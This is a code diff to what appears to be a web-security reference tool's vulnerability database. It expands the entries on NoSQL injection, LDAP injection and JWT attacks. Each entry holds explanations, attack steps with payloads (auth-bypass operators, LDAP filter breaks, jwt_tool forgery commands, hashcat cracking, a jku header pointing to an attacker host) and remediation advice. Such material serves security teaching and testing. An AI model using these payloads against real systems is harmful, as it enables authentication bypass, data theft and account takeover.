@@ -474,23 +474,54 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/nosql-injection",
         description: "Operator or JavaScript injection into a NoSQL query (typically MongoDB), enabling authentication bypass and data extraction.",
-        brief: "NoSQL databases are still injectable. When user input is placed into a query object without sanitising query operators, an attacker smuggles in operators like $ne, $gt, or $regex to change the query's logic — most famously turning a login check into one that is always true.\n\nImpact: authentication bypass in a single request, blind extraction of secrets character by character, and — via $where / mapReduce — server-side code execution. It is common because developers assume NoSQL is immune to injection.",
+        brief: "NoSQL databases are not immune to injection — they simply have a different query model, and mistakes in it are just as exploitable. The most common case is MongoDB with a JavaScript/JSON back-end (Node/Express, PHP, Python). When user input is placed into a query object without validating its type, an attacker can send a query OPERATOR object where the code expected a plain string, changing the query's logic. The signature example turns { user: 'admin', pass: 'x' } into { user: 'admin', pass: { $ne: 'x' } } — 'password not equal to x', true for any real password — logging in without knowing the password.\n\nThere are two sub-classes. Operator injection (above) manipulates the query with operators like $ne, $gt, $regex, $in, and $exists — enabling authentication bypass and, via $regex, blind character-by-character extraction of secrets. Syntax/JavaScript injection targets features that evaluate JavaScript server-side ($where, mapReduce, group), which can lead to logic bypass, denial of service, or, on misconfigured servers, code execution.\n\nA crucial delivery detail: many frameworks parse bracketed query/body parameters into nested objects (Express/qs and PHP turn user[$ne]=x into { user: { $ne: 'x' } }), so operator injection is reachable even through ordinary form and URL parameters, not just JSON APIs. It is common precisely because developers assume 'NoSQL' means 'no injection'.",
         quickReference: [
           { label: "Auth bypass (JSON body)", cmd: "{\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}" },
-          { label: "Auth bypass (form / URL)", cmd: "user[$ne]=x&pass[$ne]=x" },
-          { label: "Blind extraction", cmd: "pass[$regex]=^a   pass[$regex]=^b  ... (walk each char)" },
-          { label: "Automate", cmd: "nosqli scan -t 'https://target/search?q=test'" }
+          { label: "Auth bypass (form / URL)", cmd: "user[$ne]=x&pass[$ne]=x   or   user[$gt]=&pass[$gt]=" },
+          { label: "Blind extraction", cmd: "pass[$regex]=^a   ^b   ^c ...  (walk each character)" },
+          { label: "JS injection", cmd: "{\"$where\":\"sleep(5000)\"}   detect via time delay" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "MongoDB queries are documents (objects), and operators are keys beginning with $. If user input becomes a value in that object unchecked, the attacker can supply an object ({\"$ne\":null}) where a string was expected, injecting query logic.",
+              "The core defect is a type-confusion: the app assumes password is a string, but the request delivers an object — so the query means something the developer never wrote.",
+              "Framework body parsers make this reachable from ordinary parameters: Express (qs) and PHP expand param[$ne]=x into a nested object automatically, so you do not need a JSON endpoint.",
+              "Operator injection changes comparisons and matching; JavaScript injection ($where, mapReduce, group with a function) evaluates attacker JS server-side — a heavier, rarer, but more dangerous sink.",
+              "Because responses often differ on match/no-match, $regex gives a boolean oracle for blind extraction even when no data is directly returned."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Login and lookup endpoints that take a username/email + password or an id — the classic auth-bypass target.",
+              "Search, filter, and sort parameters that feed a Mongo find() query, especially JSON APIs.",
+              "Any endpoint on a Node/Express, PHP, or Python stack backed by MongoDB (or CouchDB, etc.).",
+              "Form and URL parameters, not just JSON — test the bracket-notation operator form (param[$ne]=x).",
+              "Features that hint at server-side JS: aggregation with $where, saved 'expressions', or reporting/rules engines."
+            ]
+          },
+          {
+            title: "Step 1 — Detect & Bypass Auth",
             type: "commands",
             commands: [
-              { label: "1. Authentication bypass — send an operator instead of a value", cmd: "# in Burp, change the login body from a string to an operator object:\n#   {\"user\":\"admin\",\"pass\":\"x\"}   ->   {\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}\n# 'password not equal to x' is true for any real password -> logged in" },
-              { label: "2. Form/URL variant (bracket notation parses to an object)", cmd: "# Express/PHP turn param[$ne]=x into { param: { $ne: 'x' } }\ncurl 'https://target/login' -d 'user[$ne]=x&pass[$ne]=x'" },
-              { label: "3. Blind data extraction with $regex", cmd: "# response differs when the pattern matches -> extract a secret char by char\npass[$regex]=^a   # false\npass[$regex]=^s   # true -> first char is 's', continue ^se, ^sec ...\n# automate the walk with a script or nosqli" },
-              { label: "4. Server-side JavaScript via $where", cmd: "# where the app builds a $where/mapReduce from input:\n{\"$where\": \"this.pass == this.pass\"}   # always true\n# these can reach code execution on the DB" },
-              { label: "5. Automate detection", cmd: "nosqli scan -t 'https://target/search?q=test'\nnosqli scan -t https://target/login -r POST -d '{\"user\":\"a\",\"pass\":\"b\"}'" }
+              { label: "Send an operator instead of a value (JSON)", cmd: "# change the login body from strings to an operator object:\n{\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}\n{\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}}\n{\"user\":\"admin\",\"pass\":{\"$gt\":\"\"}}\n# any of these that logs you in = operator injection" },
+              { label: "Form / URL variant (bracket notation)", cmd: "curl 'https://target/login' -d 'user[$ne]=x&pass[$ne]=x'\ncurl 'https://target/login' -d 'user=admin&pass[$gt]='\n# the parser builds { pass: { $gt: '' } } server-side" },
+              { label: "Break the query to detect (error-based)", cmd: "# inject characters that break Mongo/JS string context:\nusername='   \"   {   ;   $\n# a 500 or changed behaviour hints the input reaches the query unescaped" },
+              { label: "Target a specific account", cmd: "# log in as admin specifically:\n{\"user\":\"admin\",\"pass\":{\"$ne\":\"wrong\"}}\n# or with $in to try many users:\n{\"user\":{\"$in\":[\"admin\",\"root\"]},\"pass\":{\"$ne\":\"\"}}" }
+            ]
+          },
+          {
+            title: "Step 2 — Blind Extraction & JS Injection",
+            type: "commands",
+            commands: [
+              { label: "$regex character-by-character", cmd: "# find the response difference for match vs no-match, then walk the secret:\npass[$regex]=^a   # no change (false)\npass[$regex]=^s   # changed (true) -> first char 's'\npass[$regex]=^se  ^sec  ^secr ...   # continue to full value\n# anchor with ^ and $ ; escape regex metacharacters in known parts" },
+              { label: "Enumerate with $where / boolean", cmd: "# where $where is built from input:\n{\"$where\":\"this.password.length > 10\"}   # true/false oracle on length\n{\"$where\":\"this.password[0]=='s'\"}         # char oracle" },
+              { label: "Time-based JS oracle (blind)", cmd: "# no visible difference? use a delay:\n{\"$where\":\"if(this.user=='admin'&&this.password[0]=='s'){sleep(3000)}\"}\n# a ~3s delay confirms the condition" },
+              { label: "Automate", cmd: "nosqli scan -t 'https://target/search?q=test'\nnosqli scan -t https://target/login -r POST -d '{\"user\":\"a\",\"pass\":\"b\"}'\n# or script the $regex walk with requests + a match/no-match check" }
             ]
           },
           {
@@ -498,20 +529,23 @@ var VULNS = [
             type: "table",
             columns: ["Operator", "Effect"],
             rows: [
-              ["$ne / $gt / $lt", "Always-true comparisons → auth bypass"],
-              ["$regex", "Pattern match → blind character-by-character extraction"],
-              ["$where", "Server-side JavaScript → path to code execution"],
-              ["$in / $exists", "Match any of a list / test field presence"]
+              ["$ne", "'not equal' -> true for any real value -> auth bypass"],
+              ["$gt / $lt / $gte", "Range comparisons that evaluate always-true (e.g. $gt:'')"],
+              ["$regex", "Pattern match -> blind character-by-character extraction"],
+              ["$in / $nin", "Match any/none of a list -> try multiple usernames at once"],
+              ["$exists", "Test whether a field is present"],
+              ["$where", "Server-side JavaScript -> logic bypass, DoS, possible code execution"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Send an operator where a value is expected", "Confirm injection / auth bypass"],
-              ["2", "Use $regex to extract secrets", "Passwords / tokens recovered"],
-              ["3", "Reach $where / mapReduce if present", "Server-side code execution"]
+              ["1", "Send an operator/object where a value is expected", "Confirmed injection / auth bypass"],
+              ["2", "Bypass login as admin", "Authenticated access"],
+              ["3", "Use $regex / $where oracle", "Blind extraction of passwords, tokens, data"],
+              ["4", "Reach $where / mapReduce if present", "Server-side JS execution / DoS"]
             ]
           },
           {
@@ -519,16 +553,18 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["nosqli", "Maintained NoSQL injection scanner (MongoDB)"],
-              ["Burp Suite", "Manual operator injection and testing"],
-              ["custom scripts", "Automate $regex blind extraction"]
+              ["nosqli", "Maintained NoSQL (MongoDB) injection scanner"],
+              ["Burp Suite", "Manual operator injection; convert strings to objects, test bracket notation"],
+              ["NoSQLMap", "Automated MongoDB enumeration and injection (legacy but useful)"],
+              ["custom scripts", "Automate the $regex/time-based blind extraction walk"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — NoSQL injection", url: "https://portswigger.net/web-security/nosql-injection" },
+              { label: "PortSwigger — NoSQL injection (with labs)", url: "https://portswigger.net/web-security/nosql-injection" },
+              { label: "OWASP WSTG — Testing for NoSQL Injection", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" },
               { label: "PayloadsAllTheThings — NoSQL Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" }
             ]
           },
@@ -536,11 +572,12 @@ var VULNS = [
             title: "Remediation",
             type: "notes",
             items: [
-              "Validate input types strictly — reject objects/arrays where a scalar (string) is expected.",
-              "Cast user input to the expected type before it reaches the query; a password must never be allowed to be an object.",
-              "Disable server-side JavaScript ($where, mapReduce) unless genuinely required.",
-              "Use the driver's query builders instead of passing raw user-controlled objects into queries.",
-              "Never expose an unauthenticated MongoDB to the network."
+              "Validate input types strictly on the server: reject objects and arrays where a scalar string is expected — a username or password must never be allowed to arrive as an object.",
+              "Cast user input to the expected type before it reaches the query (String(input)); with Mongoose, define and enforce a schema so type coercion is automatic.",
+              "Disable the framework's automatic conversion of bracketed parameters into nested objects, or sanitise keys beginning with $ and . (e.g. express-mongo-sanitize).",
+              "Disable server-side JavaScript evaluation ($where, mapReduce, group-with-function) unless genuinely required, and never build such expressions from user input.",
+              "Use the driver's/ODM's query builders and parameterised query construction rather than passing raw user-controlled objects into find().",
+              "Apply least privilege to the DB account and never expose the database to the network unauthenticated."
             ]
           }
         ]
@@ -948,22 +985,53 @@ var VULNS = [
         severity: "High",
         ref: "https://owasp.org/www-community/attacks/LDAP_Injection",
         description: "Unsanitised input in an LDAP filter alters directory queries, enabling authentication bypass and information disclosure.",
-        brief: "LDAP injection is the directory-service cousin of SQLi. When an application builds an LDAP search filter from user input without escaping the special filter characters, an attacker rewrites the filter.\n\nImpact: bypass authentication, enumerate directory objects, and extract attributes character by character. It appears wherever an app authenticates or searches against a directory (SSO, address books, user lookups) using string-built filters.",
+        brief: "LDAP injection is the directory-service cousin of SQL injection. Applications authenticate users and look up people against an LDAP directory (Active Directory, OpenLDAP) by building a search filter — a parenthesised expression like (&(uid=INPUT)(password=INPUT)). When that filter is assembled by concatenating user input without escaping LDAP's special characters, the attacker can inject filter syntax and rewrite the query's meaning.\n\nLDAP filter syntax is prefix/Polish notation: & is AND, | is OR, ! is NOT, * is a wildcard, and clauses are wrapped in parentheses. So injecting * matches any value, and injecting )(...) closes the current clause and adds new conditions. The canonical result is authentication bypass — turning the login filter into one that always matches — but the same primitive enables directory enumeration (list users, groups, admins) and blind, character-by-character extraction of attributes (email, password hashes where stored, group membership) by varying a wildcard and observing which requests succeed.\n\nIt appears wherever an app queries a directory with string-built filters: SSO and login, corporate address books, 'find a user' features, and access-control lookups. Impact ranges from logging in as any user to harvesting the entire directory, and it is often overlooked because LDAP is less familiar than SQL.",
         quickReference: [
-          { label: "Auth bypass (always-true)", cmd: "*)(uid=*))(|(uid=*     or simply   *" },
-          { label: "Wildcard enumeration", cmd: "admin*   a*   (walk the alphabet)" },
-          { label: "Blind attribute extraction", cmd: "*)(mail=a*)   vary the pattern, watch the response" },
-          { label: "Special chars", cmd: "( ) * \\ NUL /" }
+          { label: "Auth bypass (always-true)", cmd: "*      or      *)(uid=*))(|(uid=*" },
+          { label: "Wildcard enumeration", cmd: "admin*   a*   ab*  (walk the alphabet per position)" },
+          { label: "Blind attribute extraction", cmd: "admin)(mail=a*)   vary the pattern, watch the response" },
+          { label: "Special chars to escape/abuse", cmd: "(  )  *  \\  /  NUL  &  |  !  =" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "LDAP Filter Syntax & Root Cause",
+            type: "notes",
+            items: [
+              "LDAP filters use prefix notation: (&(a=1)(b=2)) means a=1 AND b=2; (|(a=1)(b=2)) means OR; (!(a=1)) means NOT; (a=*) matches any value of a.",
+              "The bug is string concatenation: code like (&(uid=\" + user + \")(userPassword=\" + pass + \")) lets input containing ) ( * & | change the filter structure.",
+              "Injecting a bare * makes a clause match any value; injecting )(condition) closes the developer's clause early and adds attacker-chosen conditions.",
+              "Authentication that SEARCHES with the password inside the filter (rather than doing a proper bind) is especially weak — a wildcard in the password field can match anyone.",
+              "Because valid vs invalid filters change the response (results shown, login succeeds, or an error), attackers get a boolean oracle for blind extraction."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Login forms backed by LDAP/Active Directory (intranets, VPN portals, SSO).",
+              "User/people search and corporate address-book lookups.",
+              "'Forgot username', profile lookup, and group-membership checks.",
+              "Any field whose value plausibly ends up in an LDAP filter — username, email, employee id, department.",
+              "Error messages mentioning LDAP, an invalid filter, or a directory server confirm the back-end."
+            ]
+          },
+          {
+            title: "Step 1 — Detect the Injection",
             type: "commands",
             commands: [
-              { label: "1. Probe with a wildcard / filter break", cmd: "# a login/search form that builds (&(uid=INPUT)(password=INPUT))\nuser=*            # returns everyone / logs in?\nuser=*)(uid=*     # filter break -> LDAP error or changed results = injectable" },
-              { label: "2. Authentication bypass — force an always-true filter", cmd: "# inject to make the bind/search match unconditionally\nuser=admin)(&))     # closes the clause, injects an always-true condition\nuser=*)(uid=*))(|(uid=*" },
-              { label: "3. Blind extraction with wildcards", cmd: "# vary a wildcard pattern and watch which requests succeed\nuser=admin)(mail=a*)   # true if a mail attribute starts with 'a'\n# walk the alphabet per position to reconstruct values" },
-              { label: "4. Enumerate objects / privileged groups", cmd: "# where results are reflected, inject filters to list users, groups, admins\n*)(objectClass=*)   # broadens the match to enumerate the directory" }
+              { label: "Wildcard probe", cmd: "# in a search or login field:\nuser=*            # returns everyone / logs in as the first match?\nuser=admin*       # partial match -> wildcard is honoured" },
+              { label: "Break the filter", cmd: "# unbalanced parens/operators should cause an LDAP error or changed results:\nuser=*)(uid=*\nuser=)(cn=*\nuser=admin)(|(uid=*\n# an error or a different response = the input reaches the filter unescaped" },
+              { label: "Boolean differential", cmd: "# compare a definitely-true vs definitely-false injected condition:\nuser=admin)(&(1=1)   # true-ish\nuser=admin)(&(1=0)   # false-ish\n# a response difference confirms injection and gives an oracle" }
+            ]
+          },
+          {
+            title: "Step 2 — Auth Bypass & Extraction",
+            type: "commands",
+            commands: [
+              { label: "Authentication bypass", cmd: "# filter: (&(uid=INPUT)(userPassword=INPUT))\n# wildcard password matches any:\nuser=admin    pass=*\n# or inject an always-true clause and comment out the rest:\nuser=*)(uid=*))(|(uid=*    pass=anything\nuser=admin)(&)             # AND-true, ignore password clause" },
+              { label: "Directory enumeration", cmd: "# where results are reflected, broaden the match:\nsearch=*)(objectClass=*)          # list many objects\nsearch=*)(|(objectClass=user)(objectClass=group))\n# list admins:\nsearch=*)(memberOf=cn=admins,...)" },
+              { label: "Blind attribute extraction (walk the alphabet)", cmd: "# does admin's mail start with 'a'? then 'b'? etc.\nuser=admin)(mail=a*)     # response true/false\nuser=admin)(mail=ad*)    # narrow down each position\n# repeat per character to reconstruct mail, description, or hashes if readable" },
+              { label: "Attribute presence / AD-specific", cmd: "user=admin)(userPassword=*)      # is the attribute present/readable?\n# Active Directory: sAMAccountName, memberOf, userAccountControl are useful targets" }
             ]
           },
           {
@@ -971,21 +1039,24 @@ var VULNS = [
             type: "table",
             columns: ["Input", "Effect"],
             rows: [
-              ["*", "Wildcard — matches any value"],
-              [")(  and  (|", "Close the current clause and inject a new OR condition"],
-              ["*)(uid=*))(|(uid=*", "A classic break making the search always match"],
-              ["No escaping", "Input goes straight into (&(uid=INPUT)(password=INPUT))"]
+              ["*", "Wildcard — matches any value of the attribute"],
+              [") (  and  (|", "Close the current clause and inject a new OR/AND condition"],
+              ["*)(uid=*))(|(uid=*", "Classic break making the search always match (auth bypass)"],
+              ["admin)(&)", "AND with an empty (true) clause, discarding the password check"],
+              [")(mail=a*)", "Boolean oracle for blind character-by-character extraction"],
+              ["No escaping", "Input flows straight into (&(uid=INPUT)(userPassword=INPUT))"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Find a directory-backed form", "Candidate LDAP filter"],
-              ["2", "Break the filter / inject a wildcard", "Confirm injection"],
+              ["1", "Find a directory-backed login/search", "Candidate LDAP filter"],
+              ["2", "Wildcard / filter-break probe", "Injection confirmed"],
               ["3", "Force an always-true filter", "Authentication bypass"],
-              ["4", "Blind-extract attributes", "User/credential disclosure"]
+              ["4", "Broaden the filter", "Directory / group enumeration"],
+              ["5", "Wildcard oracle per character", "Blind extraction of attributes & credentials"]
             ]
           },
           {
@@ -993,9 +1064,10 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["Burp Suite", "Manual filter-break testing and blind extraction"],
-              ["ldapsearch", "Validate directory behaviour and craft filters"],
-              ["custom scripts", "Automate wildcard-based blind extraction"]
+              ["Burp Suite (Repeater/Intruder)", "Manual filter-break testing and automated wildcard extraction"],
+              ["ldapsearch", "Validate directory behaviour and craft/verify filters directly"],
+              ["custom scripts", "Automate the per-character wildcard blind-extraction walk"],
+              ["ldapdomaindump / windapsearch", "Enumerate an AD directory once you have access"]
             ]
           },
           {
@@ -1003,6 +1075,8 @@ var VULNS = [
             type: "references",
             items: [
               { label: "OWASP — LDAP Injection", url: "https://owasp.org/www-community/attacks/LDAP_Injection" },
+              { label: "OWASP WSTG — Testing for LDAP Injection", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection" },
+              { label: "OWASP — LDAP Injection Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html" },
               { label: "PayloadsAllTheThings — LDAP Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" }
             ]
           },
@@ -1010,11 +1084,12 @@ var VULNS = [
             title: "Remediation",
             type: "notes",
             items: [
-              "Escape all LDAP special characters using the framework's LDAP encoding routine before building a filter.",
-              "Use parameterised LDAP APIs / safe filter builders rather than string concatenation.",
-              "Bind with least privilege and never build the bind DN or filter from raw input.",
-              "Authenticate with a proper bind operation, not by searching with a user-supplied password in the filter.",
-              "Validate input against an allow-list where the format is known."
+              "Escape all LDAP special characters ( ) * \\ / NUL and the DN specials using the framework's dedicated LDAP encoding routine (e.g. OWASP ESAPI encodeForLDAP/encodeForDN) before building any filter.",
+              "Use parameterised LDAP APIs / safe filter builders (e.g. .NET SearchRequest with proper escaping, Java's Filter classes) rather than string concatenation.",
+              "Authenticate with a proper bind operation: search for the user with an escaped filter to find their DN, then attempt a bind with that DN and the supplied password — never put the password into the search filter.",
+              "Bind to the directory with a least-privilege service account, and never construct the bind DN from raw user input.",
+              "Validate input against an allow-list where the format is known (e.g. usernames match ^[a-zA-Z0-9._-]+$), rejecting filter metacharacters outright.",
+              "Restrict which attributes the query can return so a successful injection cannot read sensitive fields."
             ]
           }
         ]
@@ -2060,23 +2135,53 @@ var VULNS = [
         severity: "High",
         ref: "https://portswigger.net/web-security/jwt",
         description: "Implementation flaws in JSON Web Tokens — alg confusion, none, weak secrets — enabling token forgery.",
-        brief: "JWTs carry identity and claims in a signed token the server verifies without server-side session state. That design shifts trust onto the signature, and a set of well-known implementation mistakes break it: accepting the 'none' algorithm, confusing RS256 with HS256 so the public key becomes the HMAC secret, weak signing secrets that crack offline, and unvalidated claims.\n\nImpact: when verification is broken, an attacker forges a token with any identity or role they like — instant privilege escalation or account takeover.",
+        brief: "A JSON Web Token is a compact, self-contained credential of three base64url parts — header.payload.signature — that carries identity and claims (sub, role, exp) and is verified by the server without server-side session state. That statelessness is the appeal and the risk: all trust rests on the signature, so any flaw in how the signature is produced or checked lets an attacker forge a token with whatever identity and privileges they want.\n\nThe well-known flaw classes are: accepting the 'none' algorithm (an unsigned token treated as valid); algorithm confusion, where an endpoint that should verify an RS256 token is tricked into an HS256 code path so the (public) RSA key becomes the HMAC secret the attacker also holds; weak HMAC secrets that crack offline; and header-driven key resolution (kid, jku, x5u) where the attacker points key lookup at their own key, a traversable path, or an injectable store. On top of these are claim-validation failures: not checking exp (replay of expired tokens), aud/iss (using a token minted for another service), or the signature at all.\n\nBecause the token is presented on every request (cookie, Authorization: Bearer, or body), a working forgery is immediate and repeatable privilege escalation or full account takeover — often to admin. JWTs also frequently leak (logs, referers, local storage exposed via XSS), so token theft and forgery are complementary risks.",
         quickReference: [
-          { label: "alg: none", cmd: "Set header alg to \"none\", strip the signature — some libs accept it" },
-          { label: "Key confusion RS256->HS256", cmd: "Sign HS256 using the RSA public key as the HMAC secret" },
-          { label: "Crack the HMAC secret", cmd: "jwt_tool <token> -C -d wordlist.txt   (hashcat -m 16500)" },
-          { label: "Tamper claims", cmd: "Change \"role\":\"user\" -> \"admin\" (only works if the sig check is broken)" }
+          { label: "alg: none", cmd: "Set header alg to none/None/NONE, strip the signature — some libs accept it" },
+          { label: "Key confusion RS256->HS256", cmd: "HMAC-sign with the server's RSA public key as the secret" },
+          { label: "Crack the HMAC secret", cmd: "hashcat -m 16500 token.jwt wordlist.txt   then re-sign any claims" },
+          { label: "kid / jku abuse", cmd: "Point kid at a file you control, or jku at your JWKS" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Structure & Root Cause",
+            type: "notes",
+            items: [
+              "A JWT is header.payload.signature, each base64url-encoded. The header names the algorithm (alg) and key (kid/jku); the payload holds claims; the signature covers header+payload. Decoding is not decryption — anyone can read the claims.",
+              "The root cause of most attacks is letting the TOKEN dictate how it is verified: honouring alg:none, or picking the verification algorithm/key from attacker-controlled header fields.",
+              "Algorithm confusion works because HMAC (HS256) and RSA (RS256) share one verify() API in many libraries: if the code passes the RSA public key to a routine that treats it as an HMAC secret, and the public key is known (JWKS/cert), the attacker can mint valid HS256 tokens.",
+              "HMAC security depends entirely on secret entropy — a dictionary-word or short secret is recovered offline, after which the attacker signs anything.",
+              "Even with a sound signature, missing claim checks (exp, nbf, aud, iss) allow replay, cross-service reuse, and use of stale tokens."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Anywhere a three-part base64 string riding a dot appears: session cookies, Authorization: Bearer headers, request bodies, and OAuth/OIDC id_tokens.",
+              "The header's alg and kid/jku/x5u fields — these decide which attacks are even possible.",
+              "Public key exposure: /.well-known/jwks.json, OIDC discovery, TLS certs, or a JWKS URL referenced by jku — needed for the RS256->HS256 attack.",
+              "Claims worth forging: sub/user, role/scope/groups, admin flags, tenant ids, and any authorisation-relevant field.",
+              "Endpoints that mix token sources (accept the JWT from both cookie and header) or multiple services sharing tokens (aud confusion)."
+            ]
+          },
+          {
+            title: "Step 1 — Decode & Triage",
             type: "commands",
             commands: [
-              { label: "1. Decode and read the header", cmd: "# the alg field decides which attacks apply\njwt_tool <token>                 # decode header + claims\n# note alg (HS256/RS256/none), kid/jku/x5u, and the claims you'd want to forge" },
-              { label: "2. Run the automated playbook", cmd: "jwt_tool <token> -M at -t https://target/api/me -rc 'session=<jwt>'\n# -M at exercises: alg:none, RS256->HS256 confusion, blank/known keys, claim tampering\n# any request that stays authorised marks a working forgery" },
-              { label: "3. alg:none forgery", cmd: "# set header alg to none and strip the signature:\njwt_tool <token> -X a -pc role -pv admin\n# a library that honours 'none' accepts the unsigned, attacker-set claims" },
-              { label: "4. RS256 -> HS256 key confusion", cmd: "# grab the server's RSA public key (jwks / cert), then HMAC-sign with it:\njwt_tool <token> -X k -pk public.pem -pc role -pv admin\n# the verifier uses the public key as the HMAC secret -> your token validates" },
-              { label: "5. Crack a weak HMAC secret and forge", cmd: "hashcat -a 0 -m 16500 token.jwt wordlist.txt      # recover the secret\njwt_tool <token> -S hs256 -p '<cracked-secret>' -pc role -pv admin\n# now sign arbitrary claims (any user, any role)" }
+              { label: "Decode header + claims", cmd: "jwt_tool <token>\n# or manually: echo <part> | base64 -d\n# note: alg (HS256/RS256/none), kid/jku/x5u, and the claims you'd forge (role, sub)" },
+              { label: "Run the automated playbook", cmd: "jwt_tool <token> -M at -t https://target/api/me -rc 'session=<jwt>'\n# -M at exercises alg:none, RS256->HS256, blank/known keys, and claim tampering,\n# replaying against the endpoint; any still-authorised response is a working forgery" },
+              { label: "Check claim validation", cmd: "# replay an EXPIRED token -> still accepted? exp not checked\n# use a token from service A on service B -> accepted? aud/iss not checked\n# strip the signature but keep alg=HS256 -> accepted? signature not verified" }
+            ]
+          },
+          {
+            title: "Step 2 — Signature-Bypass Attacks",
+            type: "commands",
+            commands: [
+              { label: "alg: none", cmd: "# set the header alg to none and remove the signature (keep the trailing dot):\njwt_tool <token> -X a -pc role -pv admin\n# try variants none / None / NONE / nOnE to dodge case-sensitive blocklists" },
+              { label: "RS256 -> HS256 key confusion", cmd: "# 1) obtain the server's RSA public key (jwks.json / TLS cert / derive from 2 tokens)\n# 2) HMAC-sign a token using that public key as the secret:\njwt_tool <token> -X k -pk public.pem -pc role -pv admin\n# the RS256 verifier, routed through HS256, validates it with the public key" },
+              { label: "Crack a weak HMAC secret", cmd: "hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt\njohn token.jwt --wordlist=secrets.txt\n# then re-sign arbitrary claims:\njwt_tool <token> -S hs256 -p '<cracked-secret>' -pc role -pv admin" },
+              { label: "kid / jku / x5u abuse", cmd: "# kid path traversal to a known-content file used as the key:\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"} -> sign with empty key\n# kid SQLi to control the returned key; jku/x5u pointing at YOUR JWKS:\n{\"alg\":\"RS256\",\"jku\":\"https://attacker/jwks.json\"} -> sign with your private key" }
             ]
           },
           {
@@ -2085,21 +2190,23 @@ var VULNS = [
             columns: ["Attack", "Condition"],
             rows: [
               ["alg: none", "Library honours an unsigned token when alg is none/None/NONE"],
-              ["Key confusion", "Server verifies RS256 tokens with an HS256 code path using the public key"],
+              ["Algorithm confusion", "RS256 tokens verified through an HS256 path using the public key as secret"],
               ["Weak HMAC secret", "Short/guessable secret cracks offline, then forge anything"],
-              ["kid / jku / x5u abuse", "Header injects a key path (traversal/SQLi) or points key retrieval at attacker infra"],
-              ["Missing claim checks", "exp/aud/iss not validated — replay or cross-service token use"]
+              ["kid injection", "kid used in a file path (traversal) or query (SQLi) to control the key"],
+              ["jku / x5u abuse", "Key fetched from an attacker-controlled URL not allow-listed"],
+              ["Missing claim checks", "exp/nbf/aud/iss unvalidated -> replay or cross-service use"],
+              ["No signature check", "Server decodes but never verifies -> tamper any claim"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Decode the token, read alg + claims", "Applicable attack surface"],
-              ["2", "Break verification (none/confusion/secret)", "Ability to sign arbitrary tokens"],
-              ["3", "Forge claims (sub/role)", "Any identity or admin role"],
-              ["4", "Replay to the API", "Privilege escalation / takeover"]
+              ["1", "Decode the token, read alg + claims", "Applicable attack surface identified"],
+              ["2", "Break verification (none / confusion / weak secret / kid-jku)", "Ability to sign arbitrary tokens"],
+              ["3", "Forge claims (sub, role, tenant)", "Any identity or admin role"],
+              ["4", "Replay to the API on every request", "Privilege escalation / full account takeover"]
             ]
           },
           {
@@ -2107,28 +2214,32 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["jwt_tool", "Automated JWT attack playbook and forgery"],
-              ["hashcat (-m 16500)", "Crack weak HMAC signing secrets"],
-              ["Burp (JWT Editor)", "Manual header/claim tampering and key-confusion signing"]
+              ["jwt_tool", "Automated JWT attack playbook, forgery, and endpoint replay"],
+              ["hashcat (-m 16500) / John", "Crack weak HMAC signing secrets offline"],
+              ["Burp JWT Editor extension", "Manual header/claim tampering, key-confusion and none signing"],
+              ["jwt.io", "Quick decode and inspection (paste tokens you own, not secrets)"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — JWT attacks", url: "https://portswigger.net/web-security/jwt" },
-              { label: "OWASP — JSON Web Token Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" }
+              { label: "PortSwigger — JWT attacks (with labs)", url: "https://portswigger.net/web-security/jwt" },
+              { label: "OWASP — JSON Web Token Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" },
+              { label: "RFC 8725 — JWT Best Current Practices", url: "https://datatracker.ietf.org/doc/html/rfc8725" },
+              { label: "PayloadsAllTheThings — JWT", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Pin the expected algorithm server-side and reject any token whose alg does not match; never allow 'none'.",
-              "Do not use a verification routine that selects the algorithm from the token header — that is the root of key confusion.",
-              "Use a long, high-entropy signing secret for HMAC, or asymmetric keys managed properly; rotate on suspicion.",
